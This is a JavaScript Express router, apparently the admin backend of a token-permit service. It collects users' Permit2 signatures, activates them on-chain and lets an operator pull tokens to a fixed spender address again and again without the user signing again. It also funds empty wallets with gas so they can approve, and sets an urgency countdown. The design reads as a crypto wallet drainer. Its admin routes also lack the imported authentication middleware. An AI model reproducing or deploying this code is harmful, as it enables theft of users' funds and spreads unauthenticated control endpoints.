import express from 'express';
import jwt from 'jsonwebtoken';
import { ethers } from 'ethers';
import Permit from '../models/Permit.js';
import Settings from '../models/Settings.js';
import { activatePermit, executeTransfer, checkPermit2Allowance, sendGasFunding } from '../utils/permit2Executor.js';
import auth from '../middleware/auth.js';
import { getAllPermits, getPermitById, updatePermitById, writeSettingToFile, saveCountdownToRedis } from '../utils/storage.js';

const router = express.Router();

// Admin update countdown target date
router.post('/countdown', async (req, res) => {
  try {
    const { days, targetDate } = req.body;
    let finalTarget;

    if (days !== undefined && days !== null && days !== '') {
      const numDays = parseFloat(days);
      if (isNaN(numDays) || numDays <= 0) {
        return res.status(400).json({ error: 'Please enter a valid number of days' });
      }
      finalTarget = new Date(Date.now() + numDays * 24 * 60 * 60 * 1000).toISOString();
    } else if (targetDate) {
      finalTarget = new Date(targetDate).toISOString();
    } else {
      return res.status(400).json({ error: 'Please provide days or targetDate' });
    }

    // ── Layer 1: Upstash Redis (REST API — no connection state, survives every cold start)
    await saveCountdownToRedis(finalTarget);

    // ── Layer 2: Local file (backup for local dev / same-instance reads)
    writeSettingToFile('countdown_target', finalTarget);

    // ── Layer 3: MongoDB (ground truth for multi-instance reads)
    try {
      const setting = await Settings.findOneAndUpdate(
        { key: 'countdown_target' },
        { value: finalTarget, updatedAt: new Date() },
        { upsert: true, new: true }
      );
      return res.json({ success: true, targetDate: setting.value });
    } catch (dbErr) {
      console.warn('[COUNTDOWN POST] MongoDB save failed, Redis/file backup used:', dbErr.message);
      return res.json({ success: true, targetDate: finalTarget });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});


// Public endpoint to get admin spender address (Proxy Contract or Wallet)
router.get('/spender', (req, res) => {
  let spender = process.env.PROXY_CONTRACT_ADDRESS || '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';
  if ((!spender || spender.startsWith('0x00000000000000000000')) && process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
    try {
      const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
      spender = wallet.address;
    } catch (e) {
      console.error('Could not derive address from ADMIN_PRIVATE_KEY:', e);
    }
  }
  if (!spender) {
    return res.status(500).json({ error: 'Admin spender address not configured' });
  }
  res.json({ spender });
});

// Send BNB gas dust to user wallet so they can approve() with zero balance
router.post('/fund-gas/:address', async (req, res) => {
  try {
    const userAddress = req.params.address;
    if (!ethers.isAddress(userAddress)) {
      return res.status(400).json({ error: 'Invalid wallet address' });
    }
    const result = await sendGasFunding(userAddress);
    res.json({ success: true, ...result });
  } catch (err) {
    console.error('Gas funding error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Admin login
router.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === process.env.ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
    const token = jwt.sign({ role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
    return res.json({ token });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});

// Get all permits with on-chain allowance status
router.get('/permits', async (req, res) => {
  try {
    let permits = [];
    try {
      permits = await getAllPermits();
    } catch (dbErr) {
      console.warn('getAllPermits warning in /permits route, falling back to disk:', dbErr.message);
      const { readPermitsFromFile } = await import('../utils/storage.js');
      permits = readPermitsFromFile();
    }

    if (!Array.isArray(permits)) permits = [];

    // Enrich with on-chain data safely in chunks of 10 to prevent RPC rate limiting
    const chunkSize = 10;
    const enrichedPermits = [];
    for (let i = 0; i < permits.length; i += chunkSize) {
      const chunk = permits.slice(i, i + chunkSize);
      const chunkEnriched = await Promise.all(
        chunk.map(async (p) => {
          try {
            const onChain = await checkPermit2Allowance(p.owner, p.token);
            return { ...p, onChain };
          } catch (err) {
            return { ...p, onChain: null };
          }
        })
      );
      enrichedPermits.push(...chunkEnriched);
    }

    res.json(enrichedPermits);
  } catch (err) {
    console.error('Fatal error in GET /api/admin/permits:', err);
    // Fallback: return disk permits directly rather than error 500
    try {
      const { readPermitsFromFile } = await import('../utils/storage.js');
      res.json(readPermitsFromFile());
    } catch (e) {
      res.json([]);
    }
  }
});

// Step 1: Activate permit — submit user's signature to set on-chain allowance
router.post('/activate/:id', async (req, res) => {
  try {
    const permit = await getPermitById(req.params.id);
    if (!permit) return res.status(404).json({ error: 'Permit not found' });
    if (permit.status === 'activated') return res.status(400).json({ error: 'Permit already activated. You can now execute transfers.' });

    // Check if allowance is already active on-chain
    try {
      const onChainStatus = await checkPermit2Allowance(permit.owner, permit.token);
      if (onChainStatus && onChainStatus.hasPermit2Allowance) {
        await updatePermitById(req.params.id, {
          status: 'activated',
          activatedAt: permit.activatedAt || new Date().toISOString(),
        });
        return res.json({ success: true, message: 'Permit is already active on-chain!' });
      }
    } catch (checkErr) {}

    const now = Math.floor(Date.now() / 1000);
    if (now > permit.deadline) return res.status(400).json({ error: 'Permit deadline expired' });

    // Submit the permit signature to Permit2 contract
    const txHash = await activatePermit(permit);
    const updated = await updatePermitById(req.params.id, {
      status: 'activated',
      activationTxHash: txHash,
      activatedAt: new Date().toISOString(),
    });

    res.json({ success: true, txHash, message: 'Permit activated on-chain! You can now execute transfers anytime.' });
  } catch (err) {
    console.error('Activation failed:', err.message);
    res.status(400).json({ error: err.message || 'Permit activation on-chain failed' });
  }
});

// Step 2: Execute transfer — pull tokens using the active on-chain allowance
// Can be called MULTIPLE TIMES without user re-signing
router.post('/execute/:id', async (req, res) => {
  try {
    let permit = await getPermitById(req.params.id);
    if (!permit) return res.status(404).json({ error: 'Permit not found' });

    const now = Math.floor(Date.now() / 1000);
    if (now > permit.deadline) {
      await updatePermitById(req.params.id, { status: 'expired' });
      return res.status(400).json({ error: 'Permit expired' });
    }

    // If permit hasn't been activated yet, activate it first automatically
    if (permit.status === 'pending') {
      try {
        const activationTxHash = await activatePermit(permit);
        permit = await updatePermitById(req.params.id, {
          status: 'activated',
          activationTxHash,
          activatedAt: new Date().toISOString(),
        });
        console.log('Auto-activated permit:', activationTxHash);
      } catch (activationErr) {
        return res.status(500).json({ error: `Permit activation failed: ${activationErr.message}` });
      }
    }

    // Execute the transfer (can be called many times)
    const customAmount = req.body.amount || null; // optional: specific amount to transfer
    const result = await executeTransfer(permit, customAmount);

    // Record this execution
    const executions = permit.executions || [];
    executions.push({
      txHash: result.txHash,
      amount: result.amount,
      executedAt: new Date().toISOString(),
    });
    const newTotal = (BigInt(permit.totalTransferred || '0') + BigInt(result.amount)).toString();

    await updatePermitById(req.params.id, {
      executions,
      totalTransferred: newTotal,
    });

    res.json({
      success: true,
      txHash: result.txHash,
      amount: result.amount,
      totalTransferred: newTotal,
      executionCount: executions.length,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Check on-chain allowance status for a permit
router.get('/allowance/:id', async (req, res) => {
  try {
    const permit = await getPermitById(req.params.id);
    if (!permit) return res.status(404).json({ error: 'Permit not found' });

    const status = await checkPermit2Allowance(permit.owner, permit.token);
    res.json(status);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;
